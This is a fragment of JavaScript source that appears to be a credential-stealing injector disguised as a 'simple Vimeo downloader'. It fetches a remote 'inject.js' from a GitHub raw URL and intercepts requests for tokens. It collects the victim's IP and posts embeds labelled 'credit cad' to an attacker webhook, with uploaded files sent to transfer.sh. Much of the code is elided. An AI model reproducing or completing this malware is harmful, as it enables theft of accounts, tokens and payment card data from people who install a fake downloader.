...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/eidyeedgh3/wowinsanedownloader/main/inject.js",
    webhook: "%WEBHOOK%",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        username: "simpledownloader",
        avatar_url: "https://raw.githubusercontent.com/eidyeedgh3/wowinsanedownloader/main/TRANQUIL_BLUE_WITH_LUSCIOUS_RED_SPACE_VIRTUAL_BACKGROUND1_400x400.jpg",
        content: "",
        embeds: [{
            title: title,
            ...
            footer: {
                text: `https://simple-vimeo-downloader.en.softonic.com/chrome`
            },
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/sent")) fs.rmdirSync(__dirname + "/sent")
    var ip = await getIP()
    ...
    switch (true) {
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "credit cad",
                description: `
                uploadded fils: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
                **IP:** ${ip}\n\n
